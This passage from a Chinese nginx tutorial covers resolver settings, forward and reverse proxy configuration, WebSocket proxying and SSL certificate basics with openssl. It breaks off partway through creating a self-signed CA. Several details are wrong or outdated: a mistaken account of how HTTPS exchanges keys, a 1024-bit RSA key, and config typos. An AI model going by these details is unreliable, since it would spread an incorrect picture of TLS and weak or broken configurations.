nginx会缓存解析的结果。默认缓存时间是名字解析响应中的TTL字段的值,可以通过valid参数更改。

resolver_timeout指令
语法: resolver_timeout time;
默认值: resolver_timeout 30s;
配置段: http,server,location
解析超时时间。

</pre><textarea>resolver 114.114.114.114 8.8.8.8;
server {
  resolver_timeout 5s;
  listen 81;
  access_log  e:/wwwrootproxy.access.log;
  error_log   e:/wwwrootproxy.error.log;

  location / {
    proxy_pass http://$host$request_uri;
  }
}

</textarea><textarea>server {
  listen 8090;
  location / {
    resolver 218.85.157.99 218.85.152.99;
    resolver_timeout 30s;
    proxy_pass http://$host$request_uri;
  }
  access_log  /data/httplogs/proxy-$host-aceess.log;
}


</textarea>

<h4>反向代理</h4><pre>
反向代理是Nginx做的最多的事,即真实的服务器不能直接被外部网络访问,所以需要一台代理服务器,而代理服务器能被外部网络访问的同时又跟真实服务器在同一个网络环境,当然也可能是同一台服务器,端口不同而已。
当网站的访问量达到一定程度后,单台服务器不能满足用户的请求时,需要用多台服务器集群可以使用nginx做反向代理,并且多台服务器可以平均分担负载,不会因为某台服务器负载高宕机而某台服务器闲置的情况。

【 proxy_pass指令代理转发,不影响浏览器地址栏的url 】
Syntax: proxy_pass URL;
Default:  —
Context:  location,if in location,limit_except

proxy_pass http://localhost:8000/uri/;
proxy_pass http://unix:/tmp/backend.socket:/uri/;
proxy_pass http://127.0.0.1$request_uri;  # 使用变量
proxy_pass http://$host$uri;

# 捕捉一个/api/pp/asdasd的请求转发到/pp/asdasd
location ~ ^/api/(.*) {
  proxy_pass http://127.0.0.1:8000/$1?$args;
}

</pre>多个if里面proxy_pass可能有冲突时加上break<textarea>server {
  listen 127.0.0.1:80;
  set $test  A; 
  set $testB B;
  location / {
    if ($test ~* "A") { 
      proxy_pass http://www.so.com; 
      break; 
    } 
    if ($testB ~* "B") { 
      proxy_pass http://www.sogou.com; 
      #break; 
    } 
  }

  # usg=0和usg=2这两参数互斥,所以根据上面location中if指令的逻辑,不用break也可以正确处理,且放到最上面。对于uid的匹配,由于会和usg进行冲突,所以只能放到最下面或加break
  location /test/ {
    root    html;
    index   index.html index.htm index.php;
    proxy_redirect      off;
    proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header    X-Real-IP $remote_addr;
    proxy_set_header    Host $http_host;
    proxy_http_version  1.1;
    proxy_set_header    Connection "";

    if ( $arg_uid ~* "(.*[AB]$)" ) {
      proxy_pass      http://local_workerf;
      break;
    }
    if ( $query_string ~* "usg=0" ) {
      proxy_pass      http://local_workera;
    }

    if ( $query_string ~* "usg=1" ) {
      proxy_pass      http://local_workerb;
    }
    proxy_pass    http://local_workera;
  }
}
</textarea><pre>
【 在proxy_pass中使用变量 】
proxy_pass中可以使用变量,但如果变量涉及到域名的话需要使用resolver指令解析变量中的域名(因为nginx一开始就会解析好域名)

### 不涉及到域名变量
location ~* /aa/bb(.*) {
  proxy_pass http://backup$1;  # 正常使用变量,注意此处为location的正则匹配proxy_pass不能带/,转发后为 127.0.0.1:9999/test
}

### 涉及到域名的变量
location /aa/bb {
  resolver 8.8.8.8;  # google域名解析
  set $myhost "www.test.com";  # 此处变量涉及到了域名需要调用resolver指令进行解析,否则会报错。
  proxy_pass http://$myhost;
}

【 proxy_pass是否以/结尾 】
在nginx中配置proxy_pass时,当在后面的url加上了/,相当于是绝对路径,则nginx不会把location中匹配的路径部分加入代理uri;如果没有/,则会把匹配的路径部分加入代理uri。

1.如果proxy_pass的URL定向里包括URI,那么请求中匹配到location中URI的部分会被proxy_pass后面URL中的URI替换：
# 请求http://127.0.0.1/name/test.html会被代理到http://example.com/remote/test.html
location /name/ {
  proxy_pass http://127.0.0.1/remote/;
}

2.如果proxy_pass的URL定向里不包括URI,那么请求中的URI会保持原样传送给后端server：
# 请求http://127.0.0.1/name/test.html会被代理到http://127.0.0.1/name/test.html
location /name/ {
  proxy_pass http://127.0.0.1;
}

3.一些情况下不能确定替换的URI
location里是正则表达式,这种情况下proxy_pass里最好不要有URI

在proxy_pass前面用了rewrite的情况下proxy_pass无效
location /name/ {
  rewrite    /name/([^/]+) /users?name=$1 break;
  proxy_pass http://127.0.0.1;
}

【 proxy_set_header指令 】
通过反向代理代理服务器访问模式,通过proxy_set配置让客户端访问透明化

Syntax: proxy_set_header field value;
Default: proxy_set_header Host $proxy_host;
         proxy_set_header Connection close;
Context:  http,server,location

proxy_set_header Host $http_host;
proxy_set_header Host $host;
proxy_set_header Host $host:$proxy_port;
proxy_set_header Accept-Encoding "";

虽然用户访问了带主机头请求nginx反向代理服务器,但反向代理服务器向下面的节点重新发出请求时,默认没有在请求头里告诉节点服务器要找哪台虚拟主机,所以web节点服务器接收到信息后发现没有主机头信息,因此就把节点服务器的第一个虚拟主机发给了反向代理。解决办法就是当反向代理服务器重新发起请求时要携带主机头信息,以明确告诉节点服务器要找哪个主机
proxy_set_header Host $host;

默认节点服务器只能记录到反向代理服务器的IP地址,而记录不到请求客户端真实的IP地址。原因就是反向代理和负载均衡的一个明显的区别,要让下面的节点服务器能记录客户端的IP,那就需要让反向代理服务器发出请求的时候带上客户端的IP信息
proxy_set_header X-Forwarded-For $remote_addr;

自定义header头
proxy_set_header remote-header-test "123123123";
自动转换成下划线形式的头部是remote_header_test

语法：underscores_in_headers on|off
默认值：off
使用字段：http,server
是否允许在header的字段中带下划线

</pre>反向代理的路径(和upstream绑定),location后面设置映射的路径<textarea>location / {
  proxy_pass http://localhost:8888;
  proxy_set_header X-real-ip $remote_addr;
  proxy_set_header Host $http_host;
}

</textarea>wsgi模式下的服务器配置访问方式<textarea>location / {
  include uwsgi_params;
  uwsgi_pass localhost:8888
}

</textarea>保存配置文件后启动Nginx,访问localhost就相当于访问localhost:8080<textarea>server {
  listen       80;
  server_name  localhost;
  client_max_body_size 1024M;

  location / {
    proxy_pass http://localhost:8080;
    proxy_set_header Host $host:$server_port;
  }
}

</textarea><textarea>worker_processes 1;
events {
  worker_connections 1024;
}
http{
  upstream lxx {
    server 192.168.0.62 weight=2;     # 默认是80端口
    server 192.168.0.161 weight=3;
  }
  server {
    listen 80;
    location / {
      proxy_pass http://lxx;                                           # 设置反向代理的转发地址
      proxy_redirect     off;                                          # 代理是否支持重定向
      proxy_set_header   Host             $host;                       # http请求的主机域名
      proxy_set_header   X-Real-IP        $remote_addr;                # 远端真实ip地址
      proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;  # 反向代理之后转发之前的ip地址
      proxy_set_header   X-NginX-Proxy    true;  　　　　　　　　　　　　# nginx代理
      proxy_http_version 1.1;
      proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
      proxy_max_temp_file_size   0;
      proxy_connect_timeout      90;    # 代理连接超时,nginx跟后端服务器连接超时时间
      proxy_send_timeout         90;
      proxy_read_timeout         90;    # 代理接收超时,连接成功后后端服务器响应时间
      proxy_buffer_size          4k;    # 设置代理服务器nginx保存用户头信息的缓冲区大小
      proxy_buffers             4 32k;  # proxy_buffers缓冲区,网页平均在32k以下的话这样设置
      proxy_busy_buffers_size    64k;   # 高负荷下缓冲大小,proxy_buffers*2
      proxy_temp_file_write_size 64k;   # 设定缓冲文件夹大小,大于该值将从upstream服务器传递请求,而不缓冲到磁盘
    }
  }
}

</textarea>请求www.xxx.com的所有请求将被转发到9000端口<textarea>upstream sample {
  server 127.0.0.1:9000;
}
server{
  listen 80;
  server_name www.xxx.com;
  location / {
    proxy_pass http://sample;
    proxy_redirect off;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header Host $http_host;
    proxy_set_header X-NginX-Proxy true;
    proxy_set_header Connection "";
    proxy_http_version 1.1;
  }
}

</textarea>http反向代理配置<textarea>/*
代理仅仅指向一个服务器
启动webapp,注意启动绑定的端口要和nginx中的upstream设置的端口保持一致。
更改host：在 C:\Windows\System32\drivers\etc目录下的host文件中添加一条DNS记录127.0.0.1 www.helloworld.com
启动nginx.exe -c conf/nginx.conf
在浏览器中访问www.helloworld.com即可
*/

#运行用户
#user somebody;

#启动进程,通常设置成和cpu的数量相等
worker_processes  1;

#全局错误日志
error_log  D:/Tools/nginx-1.10.1/logs/error.log;
error_log  D:/Tools/nginx-1.10.1/logs/notice.log  notice;
error_log  D:/Tools/nginx-1.10.1/logs/info.log  info;

#PID文件,记录当前启动的nginx的进程ID
pid D:/Tools/nginx-1.10.1/logs/nginx.pid;

#工作模式及连接数上限
events {
  worker_connections 1024;    #单个后台worker process进程的最大并发链接数
}

#设定http服务器,利用它的反向代理功能提供负载均衡支持
http {
  #设定mime类型(邮件支持类型),类型由mime.types文件定义
  include       D:/Tools/nginx-1.10.1/conf/mime.types;
  default_type  application/octet-stream;

  #设定日志
  log_format  main  '[$remote_addr] - [$remote_user] [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';

  access_log  D:/Tools/nginx-1.10.1/logs/access.log main;
  rewrite_log on;

  #sendfile指令指定nginx是否调用sendfile函数(zero copy方式)来输出文件,对于普通应用必须设为on,如果用来进行下载等应用磁盘IO重负载应用,可设置为off,以平衡磁盘与网络I/O处理速度,降低系统的uptime
  sendfile        on;
  #tcp_nopush     on;

  #连接超时时间
  keepalive_timeout  120;
  tcp_nodelay        on;

  #gzip压缩开关
  #gzip  on;

  #设定实际的服务器列表
  upstream zp_server1{
    server 127.0.0.1:8089;
  }

  #HTTP服务器
  server {
    #监听80端口,80端口是知名端口号,用于HTTP协议
    listen 80;
    #定义使用www.xx.com访问
    server_name www.helloworld.com;
    #首页
    index index.html
    #指向webapp的目录
    root D:\webapp;
    #编码格式
    charset utf-8;

    #代理配置参数
    proxy_connect_timeout 180;
    proxy_send_timeout 180;
    proxy_read_timeout 180;
    proxy_set_header Host $host;
    proxy_set_header X-Forwarder-For $remote_addr;

    #反向代理的路径(和upstream绑定),location后面设置映射的路径
    location / {
      proxy_pass http://zp_server1;
    }

    #静态文件nginx自己处理
    location ~ ^/(images|javascript|js|css|flash|media|static)/ {
      root D:\webapp\views;
      expires 30d;  #过期30天,静态文件不怎么更新则过期可以设大一点,如果频繁更新则可以设置得小一点。
    }

    #设定查看Nginx状态的地址
    location /NginxStatus {
      stub_status           on;
      access_log            on;
      auth_basic            "NginxStatus";
      auth_basic_user_file  conf/htpasswd;
    }

    #禁止访问.htxxx文件
    location ~ /\.ht {
      deny all;
    }

    #错误处理页面(可选择性配置)
    #error_page   404              /404.html;
    #error_page   500 502 503 504  /50x.html;
    #location = /50x.html {
    #    root   html;
    #}
  }
}

</textarea>

<h4>Nginx反向代理websocket配置</h4><pre>
WebSocket一种在单个TCP连接上进行全双工通讯的协议,使得客户端和服务器之间的数据交换变得更加简单,允许服务端主动向客户端推送数据。在WebSocket API中浏览器和服务器只需要完成一次握手,两者之间就直接可以创建持久性的连接,并进行双向数据传输

WebSocket是h5下一种新的协议,实现了浏览器与服务器全双工通信,能更好的节省服务器资源和带宽并达到实时通讯的目的,它与HTTP一样通过已建立的TCP连接来传输数据,但它和HTTP最大不同是：
1)WebSocket是一种双向通信协议。在建立连接后WebSocket服务器端和客户端都能主动向对方发送或接收数据,就像Socket一样;
2)WebSocket需要像TCP一样,先建立连接,连接成功后才能相互通信。

相对于传统HTTP每次请求-应答都需要客户端与服务端建立连接的模式,WebSocket是类似Socket的TCP长连接通讯模式。一旦WebSocket连接建立后,后续数据都以帧序列的形式传输。在客户端断开WebSocket连接或Server端中断连接前,不需要客户端和服务端重新发起连接请求。在海量并发及客户端与服务器交互负载流量大的情况下,极大的节省了网络带宽资源的消耗,有明显的性能优势,且客户端发送和接受消息是在同一个持久连接上发起,实时性优势明显。

相比HTTP长连接,WebSocket有以下特点：
1)是真正的全双工方式,建立连接后客户端与服务器端是完全平等的,可以互相主动请求。而HTTP长连接基于HTTP,是传统的客户端对服务器发起请求的模式。
2)HTTP长连接中,每次数据交换除了真正的数据部分外,服务器和客户端还要大量交换HTTP header,信息交换效率很低。Websocket协议通过第一个request建立了TCP连接之后,之后交换的数据都不需要发送HTTP header就能交换数据,这显然和原有的HTTP协议有区别,所以它需要对服务器和客户端都进行升级才能实现。此外还有multiplexing、不同的URL可以复用同一个WebSocket连接等功能,这些都是HTTP长连接不能做到的。

总的来说：
WebSocket与Http相同点
-  都是一样基于TCP的,都是可靠性传输协议。
-  都是应用层协议。

WebSocket与Http不同点
-  WebSocket是双向通信协议,模拟Socket协议,可以双向发送或接受信息。HTTP是单向的。
-  WebSocket是需要浏览器和服务器握手进行建立连接的。而http是浏览器发起向服务器的连接,服务器预先并不知道这个连接。

WebSocket与Http联系
WebSocket在建立握手时,数据是通过HTTP传输的,但建立之后在真正传输时候是不需要HTTP协议的。

在WebSocket中只需要服务器和浏览器通过HTTP协议进行一个握手的动作,然后单独建立一条TCP的通信通道进行数据的传送。
WebSocket连接的过程是：
1)客户端发起http请求,经过3次握手后,建立起TCP连接;http请求里存放WebSocket支持的版本号等信息,如：Upgrade、Connection、WebSocket-Version等;
2)服务器收到客户端的握手请求后,同样采用HTTP协议回馈数据;
3)客户端收到连接成功的消息后,开始借助于TCP传输信道进行全双工通信。

通过客户端和服务端交互的报文对比WebSocket通讯与传统HTTP的不同点：
1)客户端new WebSocket实例化一个新的WebSocket客户端对象,请求类似ws://yourdomain:port/path的服务端WebSocket URL,客户端WebSocket对象会自动解析并识别为WebSocket请求,并连接服务端端口,执行双方握手过程,客户端发送数据格式类似：
GET /webfin/websocket/ HTTP/1.1
Host: localhost
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: xqBt3ImNzJbYqRINxEFlkg==
Origin: http://localhost:8080
Sec-WebSocket-Version: 13

客户端发起的WebSocket连接报文类似传统HTTP报文,Upgrade：websocket参数值表明这是WebSocket类型请求,Sec-WebSocket-Key是WebSocket客户端发送的一个 base64编码的密文,要求服务端必须返回一个对应加密的Sec-WebSocket-Accept应答,否则客户端会抛出Error during WebSocket handshake错误,并关闭连接。

2)服务端收到报文后返回的数据格式类似：
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: K7DJLdLooIwIG/MOpvWFB3y3FE8=

Sec-WebSocket-Accept的值是服务端采用与客户端一致的密钥计算出来后返回客户端的,HTTP/1.1 101 Switching Protocols表示服务端接受WebSocket协议的客户端连接,经过这样的请求-响应处理后,两端的WebSocket连接握手成功,后续就可以进行TCP通讯了。

在开发方面WebSocket API也十分简单：只需要实例化WebSocket,创建连接,然后服务端和客户端就可以相互发送和响应消息

比如一个使用WebSocket应用于视频的业务思路如下：
1)使用心跳维护websocket链路,探测客户端的网红/主播是否在线
2)设置负载均衡7层的proxy_read_timeout默认为60s
3)设置心跳为50s,即可长期保持Websocket不断开

Websocket使用ws或wss的统一资源标志符,类似于HTTP或HTTPS,其中wss表示在TLS之上的Websocket,相当于HTTPS
默认Websocket的ws协议使用80端口;运行在TLS之上时wss协议默认使用443端口。wss就是ws基于SSL的安全传输,与HTTPS一样样的道理。
如果网站是HTTPS协议的就不能使用ws://,浏览器会block掉连接,和HTTPS下不允许HTTP请求一样,此时就需要使用wss:\安全协议
ws://example.com/chat
wss://example.com/chat

在实际的生产环境中要求多个WebSocket服务器必须具有高性能和高可用,那么WebSocket协议就需要一个负载均衡层
Nginx从1.3版本就开始支持WebSocket,并且可以为WebSocket应用程序做反向代理和负载均衡

WebSocket和HTTP协议不同,但WebSocket中的握手和HTTP中的握手兼容,它使用HTTP中的Upgrade协议头将连接从HTTP升级到WebSocket,这允许WebSocket应用程序更容易地适应现有的基础架构。例如WebSocket应用程序可以使用标准HTTP端口80和443,从而允许使用现有的防火墙规则
当客户端发过来一个Connection: Upgrade请求头时,Nginx是不知道的,所以当Nginx代理服务器拦截到一个客户端发来的Upgrade请求时,需要显式来设置Connection、Upgrade头信息,并使用101(交换协议)返回响应,在客户端和代理服务器、后端服务器之间建立隧道来支持WebSocket

反向代理服务器在支持WebSocket时面临一些挑战,一个是WebSocket是一个逐跳协议,因此当代理服务器拦截客户端的升级请求时需要向后端服务器发送自己的升级请求,包括相应的头文件。此外由于WebSocket连接长期存在,与HTTP使用的典型短期连接相反,反向代理需要允许这些连接保持打开状态,而不是关闭它们,因为它们似乎处于空闲状态

WebSockets仍然受到Nginx缺省为60秒的proxy_read_timeout的影响,这意味着如果有一个程序使用了WebSockets,但又可能超过60秒不发送任何数据的话,那要么需要增加超时时间,要么实现一个ping的消息以保持联系。使用ping的解决方法有额外的好处,可以发现连接是否被意外关闭

</pre><textarea># nginx.conf配置如下：
user apps apps;
worker_processes  4;
# worker_processes auto
# worker_cpu_affinity auto
error_log  logs/error.log;
pid        logs/nginx.pid;
worker_rlimit_nofile 65535;

events {
  use epoll;
  worker_connections  65535;
}

http {
  include mime.types;
  default_type application/octet-stream;

  server_names_hash_bucket_size 128;
  client_header_buffer_size     4k;
  large_client_header_buffers   432k;
  client_max_body_size          80m;

  sendfile              on;
  tcp_nopush            on;
  tcp_nodelay           on;

  client_body_timeout   5;
  client_header_timeout 5;
  keepalive_timeout     5;
  send_timeout          5;

  open_file_cache max=65535 inactive=20s;
  open_file_cache_valid    30s;
  open_file_cache_min_uses 1;

  fastcgi_connect_timeout 300;
  fastcgi_send_timeout 300;
  fastcgi_read_timeout 300;
  fastcgi_buffer_size 64k;
  fastcgi_buffers 4 64k;
  fastcgi_busy_buffers_size 128k;
  fastcgi_temp_file_write_size 128k;

  client_body_buffer_size  512k;
  proxy_connect_timeout    5;
  proxy_read_timeout       60;
  proxy_send_timeout       5;
  proxy_buffer_size        16k;
  proxy_buffers            4 64k;
  proxy_busy_buffers_size 128k;
  proxy_temp_file_write_size 128k;

  gzip on;
  gzip_min_length  1k;
  gzip_buffers     4 16k;
  gzip_http_version 1.0;
  gzip_comp_level 2;
  gzip_types       text/plain application/x-javascript text/css application/xml;
  gzip_vary on;
  proxy_temp_path   /dev/shm/temp;
  proxy_cache_path  /dev/shm/cache levels=2:2:2   keys_zone=cache_go:200m inactive=5d max_size=7g;

  log_format log_access  '$remote_addr - $remote_user [$time_local] "$request" "$request_time" "$upstream_response_time"'
            '$status $body_bytes_sent "$http_referer" '
            '"$http_user_agent" $http_x_forwarded_for $host $hostname' ;

  # 解析map指令
  # 该作用主要是根据客户端请求中$http_upgrade的值来构造改变$connection_upgrade的值,即根据变量$http_upgrade的值创建新的变量$connection_upgrade,创建的规则就是{}里面的东西,其中的规则没有做匹配,因此使用默认的,即$connection_upgrade的值会一直是upgrade。如果$http_upgrade为空字符串的话,那值会是close
  map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
  }

  include /home/apps/tengine/conf/test.com;
}

# test.com配置文件内容：
upstream test.com {
  hash $remote_addr consistent;
  server 10.0.12.108:9000;
  server 10.0.12.109:9000;
  server 192.168.1.5:9000;
}

server {
  listen       80;
  server_name  test.com;
  #charset koi8-r;
  #access_log  logs/host.access.log  main;

  location  ^~  /websocket {
    proxy_pass http://test.com;

    proxy_redirect   off;
    proxy_set_header Host $host;
    #proxy_set_header Host $host:$server_port;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

    # 如果websocket服务器在收到websocket握手包,查看Origin信息与所在域信息不符的话会直接拒绝服务,Origin必须和请求地址在一个域,不然会被拒绝访问并且返回403
    proxy_set_header Origin xxx;

    # 升级http1.1到websocket协议
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection $connection_upgrade;
  }
}

</textarea><pre>
Nginx代理webSocket经常中断的解决方法,也就是如何保持长连接
现象描述：用nginx反代代理某个业务,发现平均1分钟左右就会出现webSocket连接中断,然后查看了一下是nginx出现的问题。
产生原因：nginx等待第一次通讯和第二次通讯的时间差,超过了它设定的最大等待时间,简单来说就是超时！

解决方法1
其实只要配置nginx.conf的对应localhost里面的这几个参数就好
proxy_connect_timeout;
proxy_read_timeout;
proxy_send_timeout;

解决方法2
发心跳包,原理就是在有效地再读时间内进行通讯,重新刷新再读时间

</pre>配置示例<textarea>http {
  server {
    location / {
      root   html;
      index  index.html index.htm;
      proxy_pass http://webscoket;
      proxy_http_version 1.1;
      proxy_connect_timeout 4s;                #配置点1
      proxy_read_timeout 60s;                  #配置点2,如果没效,可以考虑这个时间配置长一点
      proxy_send_timeout 12s;                  #配置点3
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection "Upgrade";
    }
  }
}

</textarea><pre>
关于上面配置2的解释
这是服务器最大的等待时间,也就是说当webSocket使用nginx转发的时候,如果60秒内没有通讯,依然是会断开的,所以可以按照需求来设定。比如设置了10分钟,那么如果10分钟内有通讯或10分钟内有做心跳的话,是可以保持连接不中断的

WebSocket与Socket的关系
-  Socket其实并不是一个协议,而是为了方便使用TCP或UDP而抽象出来的一层,是位于应用层和传输控制层之间的一组接口。当两台主机通信时,必须通过Socket连接,Socket则利用TCP/IP协议建立TCP连接。TCP连接则更依靠于底层的IP协议,IP协议的连接则依赖于链路层等更低层次。
-  WebSocket就像HTTP一样,则是一个典型的应用层协议。
总的来说：Socket是传输控制层接口,WebSocket是应用层协议。

</pre>

<h4>https配置</h4><pre>
HTTPS其实是有两部分组成：HTTP+SSL/TLS,也就是在HTTP上加了一层处理加密信息的模块。服务端和客户端的信息传输都会通过TLS进行加密,所以传输的数据都是加密后的数据

SSL英文名为Secure Socket Layer,安全套接字层。SSL是一种数字证书,它使用ssl协议在浏览器和web server之间建立一条安全通道,数据信息在client与server之间的安全传输

https协议原理
首先客户端与服务器建立连接,各自生成私钥和公钥,是不同的。服务器返给客户端一个公钥,然后客户端拿着这个公钥把要搜索的东西加密,称之为密文,并连自己的公钥一起返回给服务器,服务器拿着自己的私钥解密密文,然后把响应到的数据用客户端的公钥加密后返回给客户端,客户端拿着自己的私钥解密密文,把数据呈现出来

如果没有敏感数据交互如简单的个人博客,使用http协议通讯一般都夠用了,页面速度还会更快,只是https更专业更安全

Nginx配置HTTPS主要有两个步骤：签署第三方可信任的SSL证书和配置HTTPS

【 SSL证书 】
SSL证书主要有两个功能：加密和身份证明,通常需要购买,也有免费的,通过第三方SSL证书机构颁发

StartCom机构上的SSL证书有以下几种：
企业级别：EV(Extended Validation)、OV(Organization Validation)
个人级别：IV(Identity Validation)、DV(Domain Validation)
其中EV、OV、IV需要付费
阿里云免费ssl证书https://www.aliyun.com/product/cas?spm=5176.8142029.security.10.3dbd6d3e3OVsT6

免费的证书安全认证级别一般比较低,不显示单位名称,不能证明网站的真实身份,仅起到加密传输信息的作用,适合个人网站或非电商网站。由于此类只验证域名所有权的低端 SSL 证书已经被国外各种欺诈网站滥用,因此强烈推荐部署验证单位信息并显示单位名称的 OV SSL 证书或申请最高信任级别的、显示绿色地址栏、直接在地址栏显示单位名称的EV SSL证书

SSL证书通过在客户端浏览器和Web服务器之间建立一条SSL安全通道(Secure socketlayer(SSL),SSL安全协议主要用来提供对用户和服务器的认证;对传送的数据进行加密和隐藏;确保数据在传送中不被改变,即数据的完整性,现已成为该领域中全球化的标准。由于SSL技术已建立到所有主要的浏览器和WEB服务器程序中,因此仅需安装服务器证书就可以激活该功能了)。即通过它可以激活SSL协议,实现数据信息在客户端和服务器之间的加密传输,可以防止数据信息的泄露。保证了双方传递信息的安全性,而且用户可以通过服务器证书验证他所访问的网站是否是真实可靠

x509证书一般会用到三类文件,key,csr,crt。
Key是私用密钥,openssl格式,通常是rsa算法。
csr是证书请求文件,用于申请证书。在制作csr文件的时候,必须使用自己的私钥来签署申请,还可以设定一个密钥。
crt是CA认证后的证书文件(windows下面的csr,其实是crt),签署人用自己的key给你签署的凭证

首先要有一个CA根证书,然后用CA根证书来签发用户证书。
用户进行证书申请：一般先生成一个私钥,然后用私钥生成证书请求(证书请求里应含有公钥信息),再利用证书服务器的CA根证书来签发证书。

自签名证书(一般用于顶级证书、根证书): 证书的名称和认证机构的名称相同.
根证书：根证书是CA认证中心给自己颁发的证书,是信任链的起始点。任何安装CA根证书的服务器都意味着对这个CA认证中心是信任的。

数字证书则是由证书认证机构(CA)对证书申请者真实身份验证之后,用CA的根证书对申请人的一些基本信息以及申请人的公钥进行签名后形成的一个数字文件。数字证书包含证书中所标识的实体的公钥,由于证书将公钥与特定的个人匹配,并且该证书的真实性由颁发机构保证,因此数字证书为如何找到用户的公钥并知道它是否有效这一问题提供了解决方案

openssl中有如下后缀名的文件
.key格式：私有的密钥
.csr格式：证书签名请求(证书请求文件),含有公钥信息,certificate signing request的缩写
.crt格式：证书文件,certificate的缩写
.crl格式：证书吊销列表,Certificate Revocation List的缩写
.pem格式：用于导出,导入证书时候的证书的格式,有证书开头,结尾的格式

【 openssl基本原理 + 生成证书 + 使用实例 】
公钥/私钥/签名/验证签名/加密/解密/非对称加密
一般的加密是用一个密码加密文件,然后解密也用同样的密码,这个是对称加密;而有些加密时加密用的一个密码,而解密用另外一组密码,这个叫非对称加密,意思就是加密解密的密码不一样
其实这是数学上的一个素数积求因子的原理的应用,其结果就是用这一组密钥中的一个来加密数据,可以用另一个解开
公钥和私钥都可以用来加密数据,相反用另一个解开,公钥加密数据,然后私钥解密的情况被称为加密解密;私钥加密数据,公钥解密一般被称为签名和验证签名

因为公钥加密的数据只有它相对应的私钥可以解开,所以可以把公钥给人,让他加密他想要传送给你的数据,这个数据只有到了有私钥的你这里才可以解开成有用的数据,其他人就是得到了,也看懂内容
同理如果你用你的私钥对数据进行签名,那这个数据就只有配对的公钥可以解开,有这个私钥的只有你,所以如果配对的公钥解开了数据,就说明这数据是你发的,相反则不是,这个被称为签名

实际应用中一般都是和对方交换公钥,然后你要发给对方的数据,用他的公钥加密,他得到后用他的私钥解密,他要发给你的数据,用你的公钥加密,你得到后用你的私钥解密,这样最大程度保证了安全性

RSA/DSA/SHA/MD5
非对称加密的算法有很多,比较著名的有RSA/DSA ,不同的是RSA可以用于加/解密,也可以用于签名验签,DSA则只能用于签名
至于SHA则是一种和md5相同的算法,它不是用于加密解密或签名的,它被称为摘要算法,就是通过一种算法,依据数据内容生成一种固定长度的摘要,这串摘要值与原数据存在对应关系,就是原数据会生成这个摘要,但是正常情况下这个摘要是不能还原成原数据的,这个算法起的作用就是如果原数据修改一点点,那么生成的摘要都会不同,传输过程中把原数据给你再给你一个摘要,你把得到的原数据同样做一次摘要算法,与给你的摘要相比较就可以知道这个数据有没有在传输过程中被修改了

实际应用过程中,因为需要加密的数据可能会很大,进行加密费时费力,所以一般都会把原数据先进行摘要,然后对这个摘要值进行加密,将原数据的明文和加密后的摘要值一起传给你.这样你解开加密后的摘要值,再和你得到的数据进行的摘要值对应一下就可以知道数据有没有被修改了,而且因为私钥只有你有,只有你能解密摘要值,所以别人就算把原数据做了修改,然后生成一个假的摘要给你也是不行的,你这边用密钥也根本解不开

CA/PEM/DER/X509/PKCS
一般的公钥不会用明文传输给别人的,正常情况下都会生成一个公钥文件 交给其他人用于加密,但是传输过程中如果有人恶意破坏,将你的公钥换成了他的公钥,然后得到公钥的一方加密数据,不是他就可以用他自己的密钥解密看到数据了吗,为了解决这个问题,需要一个公证方来做这个事,任何人都可以找它来确认公钥是谁发的.这就是CA,CA确认公钥的原理也很简单,它将它自己的公钥发布给所有人,然后一个想要发布自己公钥的人可以将自己的公钥和一些身份信息发给CA,CA用自己的密钥进行加密,这里也可以称为签名.然后这个包含了你的公钥和你的信息的文件就可以称为证书文件了.这样一来所有得到一些公钥文件的人,通过CA的公钥解密了文件,如果正常解密那么机密后里面的信息一定是真的,因为加密方只可能是CA,其他人没它的密钥啊.这样你解开公钥文件,看看里面的信息就知道这个是不是那个你需要用来加密的公钥.

实际应用中,一般人都不会找CA去签名,因为那是收钱的,所以可以自己做一个自签名的证书文件,就是自己生成一对密钥,然后再用自己生成的另外一对密钥对这对密钥进行签名,这个只用于真正需要签名证书的人,普通的加密解密数据,直接用公钥和私钥来做就可以了.

密钥文件的格式用OpenSSL生成的就只有PEM和DER两种格式,PEM的是将密钥用base64编码表示出来的,直接打开你能看到一串的英文字母,DER格式是二进制的密钥文件,X509是通用的证书文件格式定义.pkcs的一系列标准是指定的存放密钥的文件标准,这几种格式是以互相转化

数字证书是一个经证书授权中心数字签名的包含公开密钥拥有者信息以及公开密钥的文件。最简单的证书包含一个公开密钥、名称以及证书授权中心的数字签名。数字证书还有一个重要的特征就是只在特定的时间段内有效。数字证书是一种权威性的电子文档,可以由权威公正的第三方机构,即CA(例如中国各地方的CA公司)中心签发的证书,也可以由企业级CA系统进行签发。

一般证书分有三类,根证书、服务器证书和客户端证书。根证书,是生成服务器证书和客户端证书的基础,是信任的源头,也可以叫自签发证书,即CA证书。服务器证书,由根证书签发,配置在服务器上的证书。客户端证书,由根证书签发,配置在服务器上,并发送给客户,让客户安装在浏览器里的证书

【 生成证书 】
参考：http://zctya.blog.163.com/blog/static/1209178201251310292958/

openssl version
openssl version -a
根据OPENSSLDIR查看openssl的配置文件openssl.cnf,因为配置文件中对证书的名称和存放位置等相关信息都做了定义
[CA_default]

一：生成CA证书
目前不使用第三方权威机构的CA来认证,自己充当CA的角色。
1.创建私钥 ：
C:\OpenSSL\bin>openssl genrsa -out ca/ca-key.pem 1024
2.创建证书请求:
C:\OpenSSL\bin>openssl req -new -out ca/ca-req.csr -key ca/ca-key.pem
-----
Country Name (2 letter code) [AU]:cn
State or Province Name (full name) [Some-State]:beijing
Locality Name (eg, city) []:beijing
Organization Name (eg, company) [Internet Widgits Pty Ltd]:skyvision
Organizational Unit Name (eg, section) []:test
Common Name (eg, YOUR name) []:root
Email Address []:sky
3.自签署证书 ：
